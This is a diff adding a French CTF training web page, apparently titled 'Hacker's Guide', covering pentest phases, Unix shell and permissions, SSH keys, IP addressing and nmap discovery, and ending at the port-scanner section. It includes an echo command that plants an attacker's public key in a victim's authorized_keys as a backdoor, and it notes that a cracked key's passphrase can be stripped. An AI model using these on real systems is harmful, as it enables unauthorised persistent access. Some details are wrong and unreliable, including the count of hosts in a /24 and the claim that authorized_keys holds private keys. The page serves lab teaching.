@@ -1,0 +1,3154 @@
+<!DOCTYPE html><html lang="fr"><head>
+    <title>Hacker's Guide</title>
+    <link rel="canonical" href="fr/toolbox.php">
+    <link rel="alternate" href="en/toolbox.php/" hreflang="en">
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="/favicon.ico">
+
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+    <script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=G-VZGSFE1W50&amp;l=dataLayer&amp;cx=c"></script><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+
+    <link rel="stylesheet" href="/style.css">
+	
+    
+        <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-176415930-1"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-176415930-1');
+    </script>
+    
+<script>
+function getCookie(name) {
+    var dc = document.cookie;
+    var prefix = name + "=";
+    var begin = dc.indexOf("; " + prefix);
+    if (begin == -1) {
+        begin = dc.indexOf(prefix);
+        if (begin != 0) return null;
+    }
+    else
+    {
+        begin += 2;
+        var end = document.cookie.indexOf(";", begin);
+        if (end == -1) {
+        end = dc.length;
+        }
+    }
+    // because unescape has been deprecated, replaced with decodeURI
+    //return unescape(dc.substring(begin + prefix.length, end));
+    return decodeURI(dc.substring(begin + prefix.length, end));
+} 
+
+function OnVideoButtonClick(id) {
+	if (getCookie("YOLOCTF_LANG")==null) {
+		// /videos.php?id="+ videoname + "&mode=embed&w=" + webBrowser.Width + "&h=" + webBrowser.Height;
+		url="/videos.php?id="+ id + "&mode=embed";
+		window.open(url, '_blank').focus();
+	} else {
+   console.log('[[Cmd OpenVideo '+id+']]');
+	}
+}
+</script></head>
+
+
+
+
+<body class="flexcroll">
+    <div class="container-fluid">
+      <div class="jumbotron jumbotron-padding map-color-back stars">
+        <div class="col-sm-12 ">
+            <nav class="navbar  navbar-light bg-light fixed-top navbar-scrollable">
+                <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+                <a class="navbar-brand" href="#">&nbsp;&nbsp;Menu</a>
+                <div class="collapse navbar-collapse" id="navbarSupportedContent">
+                    <ul class="navbar-nav mr-auto">
+                    
+                    <li class="nav-item !active">
+                        <a class="nav-link" href="?cat=HackersGuide">Guide du Hacker</a>
+                    </li>
+                    
+                    <li class="nav-item !active">
+                        <a class="nav-link" href="?cat=Shell">Shell</a>
+                    </li>
+                    
+                    <li class="nav-item !active">
+                        <a class="nav-link" href="?cat=Network">Network</a>
+                    </li>
+                    
+                    <li class="nav-item !active">
+                        <a class="nav-link" href="?cat=NetworkDiscovery">Network Discovery</a>
+                    </li>
+                    
+                    <li class="nav-item !active">
+                        <a class="nav-link" href="?cat=HTTP">HTTP</a>
+                    </li>
+                    
+                    <li class="nav-item !active">
+                        <a class="nav-link" href="?cat=Password">Passwords</a>
+                    </li>
+                    
+                    <li class="nav-item !active">
+                        <a class="nav-link" href="?cat=cmdinjection">Injection de commandes Shell</a>
+                    </li>
+                    
+                    <li class="nav-item !active">
+                        <a class="nav-link" href="?cat=lfi">Inclusion de Fichier Local (LFI)</a>
+                    </li>
+                    
+                    <li class="nav-item !active">
+                        <a class="nav-link" href="?cat=sqli">SQLi</a>
+                    </li>
+                    
+                    <li class="nav-item !active">
+                        <a class="nav-link" href="?cat=Webshell">Web Shell</a>
+                    </li>
+                    
+                    <li class="nav-item !active">
+                        <a class="nav-link" href="?cat=transfert">Transferts de fichiers</a>
+                    </li>
+                    
+                    <li class="nav-item !active">
+                        <a class="nav-link" href="?cat=PrivEscUx">Elevation de Privilege - Unix</a>
+                    </li>
+                    
+                    <li class="nav-item !active">
+                        <a class="nav-link" href="?cat=Forensic">Forensic</a>
+                    </li>
+                    
+                    <li class="nav-item !active">
+                        <a class="nav-link" href="?cat=Acteurs">Acteurs</a>
+                    </li>
+                    
+                    <li class="nav-item !active">
+                        <a class="nav-link" href="?cat=Encode">Encode</a>
+                    </li>
+                        
+                    </ul>
+                </div>
+            </nav>
+            
+                        <div class="row no-border  my-4 map-color-bg-normal map-color-text pl-1">
+                        <h4 class="my-vertical-centered" id="chapter_Guide_du_Hacker">Guide du Hacker
+                        </h4>
+                        </div>
+                                <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=Guide">Intro</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Ce guide a pour but de simplifier la vie du débutant.<br>
+Il suit une méthodologie complète mais très simplifiée. Vous pourrez ainsi travailler sur vos premiers serveurs de niveaux faciles, et les powner sans vous perdre dans les méandres d'Internet.<br>
+<br>
+<br></p>
+<p>Les grandes phases d'un pentest (test de pénétration) sont les suivantes:  </p>
+<p><strong><em>Définition du scope</em></strong><br>
+Définir clairement la cible, et les limites.<br>
+En formation, ce qui est notre cas, il s'agit de serveurs sur une plage d'adresse IP locale, non routable sur Internet.<br>
+Pour simplifier, vous ne devez travailler que sur des adresses qui commencent par 10. comme 10.10.0.10.<br>
+Nous ne ciblons jamais les infrastructures, ni nos collègues.   </p>
+<p><strong><em>Phase de reconnaissance</em></strong><br>
+Recueillir des données et des renseignements sur votre cible.<br>
+Les sources d’informations peuvent être sources externes accessibles à tous comme les moteurs de recherche, les réseaux sociaux et le DNS (Domain Name Service) ou des informations fournies par le client.<br>
+Bases Internet: Recherches sur Google, dns,...</p>
+<p><strong><em>Phase de cartographie et énumération</em></strong><br>
+Identifier les serveurs, les ports ouverts et les services accessibles.<br>
+Bases en réseau: IP, port, services HTTP, ftp, smtp,...<br>
+<a href="?cat=Network">-&gt; IP</a><br>
+<a href="?cat=NetworkDiscovery">-&gt; Découverte de réseau</a><br>
+<a href="?cat=HTTP">-&gt; HTTP</a>   </p>
+<p><strong><em>Recherche de vulnérabilité</em></strong><br>
+Identifier des vulnérabilités connues en utilisant les versions des logiciels et des bases de données de logiciels vulnérables comme exploit_db, ou rechercher soi même des vulnérabilités basées sur le Top 10 OWASP.<br>
+Base : CVE, et idéalement python, sql,... pour comprendre l'exploit et l'adapter.<br>
+<a href="?id=cve">-&gt; CVE</a><br>
+<a href="?cat=Password">-&gt; Default Password and patterns</a><br>
+<a href="?cat=lfi">-&gt; LFI</a><br>
+<a href="?cat=cmdinjection">-&gt; Command injection</a><br>
+<a href="?cat=sqli">-&gt; SQLi</a>    </p>
+<p><strong><em>Exploitation</em></strong><br>
+Mise en application d'un exploit de manière à pouvoir lancer des commandes shell sur un serveur.<br>
+<a href="?cat=Webshell">-&gt; Webshells</a>  </p>
+<p><strong><em>Elévation de privilèges</em></strong><br>
+Passer d'un compte disposant de faibles privilèges, comme un serveur web, à un compte administrateur.<br>
+Base en shell: cd, système de fichiers, droits utilisateurs, fichier de config, sbit, sudo, ...<br>
+<a href="?cat=Shell">-&gt; Commandes shell</a><br>
+<a href="?cat=transfert">-&gt; Transfert de fichiers</a><br>
+<a href="?cat=PrivEscUx">-&gt; Elévation de privilège sur Linux</a>   </p>
+<p><strong><em>Maintient de l'accès et nettoyage</em></strong><br>
+Mise en place de backdoor et nettoyage des traces pour pouvoir se reconnecter facilement sur le serveur.<br>
+Cette manoeuvre est considérée comme avancée.<br>
+Bases: systèmes de logs   </p>
+<p><strong><em>Déplacement latéral</em></strong><br>
+Utiliser le serveur pour rebondir sur d'autres machines éventuellement situées sur d'autres réseaux internes.<br>
+Cette manoeuvre est considérée comme avancée.<br>
+Bases: tunnelling et redirection de ports   </p>
+<p>Bon hacks !</p></div>
+                   </div>
+    
+
+                        <div class="row no-border  my-4 map-color-bg-normal map-color-text pl-1">
+                        <h4 class="my-vertical-centered" id="chapter_Shell">Shell
+                        </h4>
+                        </div>
+                                <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=commandes">Commandes shell usuelles</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><pre><code>ls        : afficher le contenu du répertoire courant
+ls -l     : afficher le contenu du répertoire courant, avec des info sur les droits des fichiers
+ls -l xxx : afficher les droits du fichier xxx
+ls -al    : afficher le contenu du répertoire courant, y compris les fichiers cachés
+cat xxx   : afficher le contenu du fichier xxx
+pwd       : répertoire courant
+cd xxx    : se déplacer dans le répertoire xxx
+cd ..     : se déplacer vers le répertoire parent
+id        : identifiant du compte et groupes auquel il appartient
+uname -a  : informations sur le serveur: quelle distribution et version du kernel.
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=flag_shell">Flag</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Quelques flags sont accessibles dans ton terminal.<br>
+Tu peux commencer dans le répertoire /home/yolo/flags avant d'étendre à tout ton système.<br>
+C'est l'occasion de mettre en pratique les commandes détaillées dans ce chapitre.
+Et puisque tu lis la doc, c'est cadeau : Flag_rtfm_shell</p>
+<pre><code>cd ~/flags
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=dir">Répertoires courants</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Le système de fichier Unix part de la racine : /<br>
+Il contient généralement les répertoires:</p>
+<pre><code>/home/xxx : un répertoire par compte utilisateur xxx
+~        : votre répertoire utilisateur
+/root    : le répertoire de l'administrateur
+/tmp     :  fichiers temporaires
+/bin     : commandes systèmes
+/etc     : fichiers de configuration du système
+/var/log : logs des programmes comme le serveur web
+/var/www : emplacement par défaut des fichiers des serveurs web
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=shell-permissions">Unix - Permissions des fichiers</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Tous les fichiers et répertoires ont un propriétaire, et font parti d'un groupe.<br>
+Chaque fichier défini donc des permissions pour:   </p>
+<ul>
+<li>User:  le propriétaire   </li>
+<li>Group: les utilisateurs qui font partie du groupe   </li>
+<li>Other: les utilisateurs qui ne sont ni propriétaire ni dans le groupe   </li>
+</ul>
+<p>Les permissions de base sont:   </p>
+<ul>
+<li>Read: Lecture    </li>
+<li>Write: Ecriture    </li>
+<li>eXecute: Execution    </li>
+</ul>
+<p>Lecture des droits des fichiers</p>
+<pre><code>ls -al          : -al permet de lister les droits des fichiers, y compris cachés
+ rwxr-xr--
+ \ /\ /\ /
+  v  v  v
+  |  |  droits des autres utilisateurs (o)
+  |  |
+  |  droits des utilisateurs appartenant au groupe (g)
+  |
+ droits du propriétaire (u)
+</code></pre> 
+<pre><code>$ ls -al           
+total 192
+drwxrwxr-x 18 yolo yolo 4096 janv. 25 14:23 .          : droits du répertoire courant
+drwxrwxr-x 26 yolo yolo 4096 févr.  5 10:55 ..         : droits du répertoire parent
+-rw-rw-r--  1 yolo yolo 5917 janv. 25 14:23 readme.txt : lecture /écriture User/Group, lecture seule pour Other
+-rwxr-xr-x  1 yolo yolo 2642 janv. 25 11:31 run        : lecture/écriture/execution pour le User, lecture/execution pour le groupe et les autres
+</code></pre>   
+<p>Des permissions supplémentaires existent:   </p>
+<ul>
+<li>SUID: Set UID, le fichier est éxécuté avec les droits de son propriétaire   </li>
+<li>SGID: Set GUID, le fichier est éxécuté avec les droits de son groupe   </li>
+<li>Sticky Bit: Lorsque ce droit est positionné sur un répertoire, il interdit la suppression d'un fichier qu'il contient à tout utilisateur autre que le propriétaire du fichier.   </li>
+</ul>
+<pre><code>$ ls -al           
+total 192
+drwxrwxr-x 18 yolo yolo 4096 janv. 25 14:23 .          
+drwxrwxr-x 26 yolo yolo 4096 févr.  5 10:55 ..         
+rwsr-xr-x  1 yolo yolo 2642 janv. 25 11:31 run        : le x est remplacé par un s pour le User
+</code></pre>  
+<p>Le SUID bit nous permet de lancer des commandes avec les droits d'un autre utilisateur et faire de l'élévation de privilège.</p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=chmod">Changer les droits d'un fichier</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>La commande chmod permet d'ajouter (+) ou supprimer (-) les droits (r,w,x) aux propriétaire (u), group (g), autres (o) ou tous (a)</p>
+<pre><code>chmod u+x ./run  : ajout du droit en execution pour le propriétaire
+chmod g-x ./run  : suppression du droit d'execution pour le groupe
+chmod o+r ./run  : ajout du droit en lecture pour les autres
+chmod a+w ./run  : ajout du droit en écriture pour tous
+</code></pre>
+<p>Il est possible de préciser les valeurs de x,r,w sont directement sous forme binaire.</p>
+<pre><code>r=4, w=2, x=1 
+
+rwx = 4+2+1 = 7
+r-x = 4+0+1 = 5
+r-- = 4+0+0 = 4
+
+rwxrx-r-- = 764
+chmod 764 readme.txt
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=files">Fichiers utiles</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><pre><code>/etc/passwd : liste des comptes de la machine
+/etc/hosts : le nom de la machine et ses alias
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=find">find</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>La commande find permet de chercher des fichiers dans les répertoires, et éventuellement d'effectuer des actions sur les fichiers trouvés.</p>
+<pre><code>find . -name "*.txt"</code></pre>
+<p>Rechercher les fichiers ayant l'extention .txt dans le répertoire courant et les sous répertoires</p>
+<pre><code>find / -name "*.php"</code></pre>
+<p>Rechercher les fichiers ayant l'extention .php à partir de la racine. </p>
+<pre><code>find / -name "*.php" 2&gt;/dev/null</code></pre>
+<p>L'écran est saturé par la liste des répertoires qui nous sont interdits en lecture. La commande 2&gt;/dev/null redirige les erreurs vers le fichier virtuel /dev/null ce qui les fait disparaitre de l'affichage.</p>
+<pre><code>find / -name "*.php" -exec ls {} \; 2&gt;/dev/null</code></pre>
+<p>L'option -exec permet d'éxécuter une commande sur chaque fichier trouvé. Souvent ls -al, ou cat.<br>
+{} est remplacé par le nom du fichier trouvé.<br>
+\; signale la fin de la commande à éxécuter.</p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=find-exec">find -exec</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>La commande find permet d'éxecuter des commandes sur les fichiers trouvés.</p>
+<pre><code>find / -name *.txt -user yolo -exec cat {} \; 2&gt;/dev/null</code></pre>
+<p>Executer la commande cat sur tous les fichiers .txt appartenant à yolo à partir de la racine.    </p>
+<p><strong><em>Syntaxe de la commande:</em></strong><br>
+Le {} est remplacé par le nom des fichiers trouvés, et le \; sert de délimiteur de fin de commande à éxécuter.</p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=ssh">SSH</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Les connexions aux serveurs se font en ssh.<br>
+Soit avec un login/password</p>
+<pre><code>ssh user@hostname
+</code></pre>
+<p>Soit avec un fichier de clef privée</p>
+<pre><code>ssh -i id_rsa user@hostname
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=sshidrsa">SSH : Clef privées / Publiques</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Sur les serveurs, il est fréquent de s'identifier avec une clef privée plutôt qu'un mot de passe.
+Vos clefs se trouvent en : </p>
+<pre><code>$ ls -al ~/.ssh
+total 20
+drwx------  2 yolo yolo 4096 Apr  4 13:47 .
+drwxr-xr-x 27 yolo yolo 4096 Apr  4 13:22 ..
+-rw-------  1 yolo yolo 2610 Apr  4 13:47 id_rsa
+-rw-r--r--  1 yolo yolo  575 Apr  4 13:47 id_rsa.pub
+-rw-r--r--  1 yolo yolo 1998 Apr  1 19:45 known_hosts
+</code></pre>
+<p>Les clefs privées permettant de se connecter à votre compte sont dans le fichier :</p>
+<pre><code>~/.ssh/authorized_keys
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=sshidrsagen">SSH : Générer des clef</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Générer une paire de clef privée/publique:<br>
+Taper juste [entrée] à (empty for no passphrase) pour générer une clef privée sans mot de passe.
+Si vous saisissez un mot de passe, votre clef sera chiffrée, et vous devrez taper le mot de passe à chaque utilisation.</p>
+<pre><code>$ ssh-keygen -t rsa -b 4096 -C yolo@yoloctf.org -f id_rsa
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again:
+Your identification has been saved in id_rsa
+Your public key has been saved in id_rsa.pub
+The key fingerprint is:
+SHA256:OSHYGRwrI7LM9/8haFfVXgBlXrdHcdfEZxIv9CeWg5Q yolo@yoloctf.org
+The key's randomart image is:
++---[RSA 4096]----+
+|     .o.   .+=o*O|
+|     o.+   .Eo+=X|
+|. . + = .  ..o*=*|
+|oo . o . o. ...+o|
+|.o .    S.   .   |
+|  . . . ..       |
+|     + o .       |
+|    . o . .      |
+|       ...       |
++----[SHA256]-----+
+</code></pre>
+<p>Le fichier de clef privée ne doit être lisible que par son propriétaire.<br>
+Si besoin faire : chmod 600 id_rsa.</p>
+<pre><code>vagrant@kali:/home/yolo/tmp$ ls -al
+total 16
+drwxrwxrwx  2 yolo      yolo   4096 Apr  4 13:24 .
+drwxr-xr-x 27 yolo      yolo   4096 Apr  4 13:22 ..
+-rw-------  1 yolo      yolo   3381 Apr  4 13:24 id_rsa
+-rw-r--r--  1 yolo      yolo    742 Apr  4 13:24 id_rsa.pub
+</code></pre>
+<p>Les entêtes de clef privées sont caractéristiques</p>
+<pre><code>$ cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAgEA4hHFXkYNJLp47GZdP1LEJ3rueKhu4c9SCqzbeJfaWUJY/nZSmV76
+7KrJLvv/4Ve+Dm5bLwhJ9BkLessiIlGgx0ju+ghI7V+Ar+qAhir5chpVSGH4YIk0J8VDbJ
+...
+O9mUtgl8PKUd5AQL6sMM/FaYffu7+OFQkJzv3hxyiFEQPhsAo2K55cG8S0RWCX9Jp96U54
+lOXLj6MfGkfzuvvFS4pm9iTBrwKq8h7CubmNOnHe3TH3U/Mrzf6wq8MwAEpSeTWfnBGdRP
+tHOBQdCIQj3JAAAAEHlvbG9AeW9sb2N0Zi5vcmcBAg==
+-----END OPENSSH PRIVATE KEY-----
+</code></pre>
+<p>Entête d'une clef privée protégée par mot de passe:</p>
+<pre><code>$ cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,2AF25325A9B318F344B8391AFD767D6D
+
+NhAAAAAwEAAQAAAgEA4hHFXkYNJLp47GZdP1LEJ3rueKhu4c9SCqzbeJfaWUJY/nZSmV76
+</code></pre>
+<p>La clef publique associée :</p>
+<pre><code>$ cat id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQAxxxxx8/QoN3NBob3zs4l2mfZWkZNAtCHN2CpQ== yolo@yoloctf.org
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=sshidrsadechiffre">SSH :Enlever le mot de passe d'une clef chiffree</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Une fois le mot passe d'une clef privée trouvé avec John, il est possible de l'enlever pour se simplifier la vie.</p>
+<pre><code>openssl rsa -in [id_rsa_sec] -out [id_rsa]
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=sshidrsaauth">SSH : Authoriser l'authentification par clef privée</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Les clefs publiques permettant de se connecter en ssh sont listées, une clef par ligne, dans le fichier.</p>
+<pre><code>~/.ssh/authorized_keys
+</code></pre>
+<p>Une fois sur un compte utilisateur d'un serveur, injectez votre clef publique pour avoir un accès direct en ssh.</p>
+<pre><code>echo 'ssh-rsa AAAAB3xxxxxxtCHN2CpQ== yolo@yoloctf.org' &gt;&gt; /home/victim/.ssh/authorized_keys
+</code></pre>
+<p>Si le répertoire n'existe pas, il suffit de le créer:</p>
+<pre><code>mkdir /home/victim/.ssh
+chmod 700 /home/victim/.ssh
+echo 'ssh-rsa AAAAB3xxxxxxtCHN2CpQ== yolo@yoloctf.org' &gt;&gt; /home/victim/.ssh/authorized_keys
+chmod 600 /home/victim/.ssh/authorized_keys
+</code></pre>
+<p>Laissez tomber votre webshell, et revenez en ssh:</p>
+<pre><code>ssh -i id_rsa_yolo victim@target.com
+</code></pre></div>
+                   </div>
+    
+
+                        <div class="row no-border  my-4 map-color-bg-normal map-color-text pl-1">
+                        <h4 class="my-vertical-centered" id="chapter_Network">Network
+                        </h4>
+                        </div>
+                                <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=ip">IP : Internet Protocol</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Une adresse IP (avec IP pour Internet Protocol) est un identifiant, qui est attribuée, de façon permanente ou provisoire, à chaque machine relié à un réseau informatique (PC, téléphone, smart TV, objet connecté,...). </p>
+<p>Les adresses IPv4 (version 4) sont codées sur 32 bits. Elles sont généralement représentées en notation décimale avec quatre nombres compris entre 0 et 255, séparés par des points.
+Exemple : 172.16.254.1</p>
+<p>Un serveur possède autant d'adresses que de cartes réseaux.
+Certaines adresses ont une utilisation réservée: </p>
+<ul>
+<li>127.0.0.1, appelée <i>loopback</i> désigne notre serveur.</li>
+<li>0.0.0.0, désigne l'ensemble des adresses IP de notre serveur. </li>
+</ul>
+<p><br>
+<em>Sous-réseau</em>
+Les premiers bits de l'adresse IP précisent le numéro du réseau, les suivants le numéro de l'hôte.
+Le nombre de bits du réseau est précisé par le masque de réseau:</p>
+<ul>
+<li>10.10.10.12/16 =&gt; Réseau 10.10.x.x, il y a 65535 machines adressables sur ce réseau.</li>
+<li>10.10.10.12/24 =&gt; Réseau 10.10.10.x, il y a 128 machines adressables sur ce réseau.</li>
+</ul>
+<p>Quand nous scannons 10.10.10.1/24, nous testons toutes les adresses de 10.10.10.1 à 10.10.10.255 </p>
+<p><br>
+<em>192.168.X.X/16, 172.16.0.0/12 et 10.X.X.X/8</em></p>
+<p>Les adresses 192.168.X.X/16, 172.16.0.0/12 et 10.X.X.X/8 sont réservées pour les réseaux locaux.
+Vous ne devez pratiquer de scans et des exploits que sur des machines joignables sur ces plages d'adresses.</p>
+<p><a href="https://fr.wikipedia.org/wiki/Adresse_IP">Article sur Wikipedia: </a><a href="https://fr.wikipedia.org/wiki/Adresse_IP">https://fr.wikipedia.org/wiki/Adresse_IP</a></p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=NetIpAddr">Trouver mon IP avec 'ip addr'</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><pre><code>
+$ ip addr
+
+1: lo: <loopback,up,lower_up> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 
+   loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 
+   inet 127.0.0.1/8 scope host lo 
+   valid_lft forever preferred_lft forever 
+73: eth1@if74: <broadcast,multicast,up,lower_up> mtu 1500 qdisc noqueue state UP group default 
+   link/ether 02:42:0a:0a:0a:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0 
+   inet <span style="color:Cyan;">10.10.10.3/24</span> brd 10.10.10.255 scope global eth1 
+   valid_lft forever preferred_lft forever 
+</broadcast,multicast,up,lower_up></loopback,up,lower_up></code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=NetIfconfig">Trouver mon IP avec 'ifconfig'</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><pre><code>
+$ ifconfig 
+
+eth0: flags=4163<up,broadcast,running,multicast>  mtu 1500 
+   inet 10.10.0.2  netmask 255.255.255.0  broadcast 10.10.0.255 
+   ether 02:42:0a:0a:00:02  txqueuelen 0  (Ethernet) 
+   RX packets 7567  bytes 573298 (559.8 KiB)
+   RX errors 0  dropped 0  overruns 0  frame 0
+   TX packets 7073  bytes 4046236 (3.8 MiB)
+   TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+eth1: flags=4163<up,broadcast,running,multicast>  mtu 1500
+   inet <span style="color:Cyan;">10.10.10.3</span>  netmask <span style="color:Cyan;">255.255.255.0</span>  broadcast 10.10.10.255
+   ether 02:42:0a:0a:0a:03  txqueuelen 0  (Ethernet)
+   RX packets 15569  bytes 2618290 (2.4 MiB)
+   RX errors 0  dropped 0  overruns 0  frame 0
+   TX packets 20985  bytes 1976399 (1.8 MiB)
+   TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</up,broadcast,running,multicast></up,broadcast,running,multicast></code></pre></div>
+                   </div>
+    
+
+                        <div class="row no-border  my-4 map-color-bg-normal map-color-text pl-1">
+                        <h4 class="my-vertical-centered" id="chapter_Network_Discovery">Network Discovery
+                        </h4>
+                        </div>
+                                <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=dicoverhost">Network scanner: Recherche des serveurs</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Utiliser nmap pour identifier les serveurs sur le sous-réseau 10.10.10.4/24</p>
+<pre><code># nmap 10.10.10.4/24
+# nmap 10.10.10.1-255
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=portscanner">Port scanner: Scan des ports ouverts d'un serveur</a>
+			</div>
+				
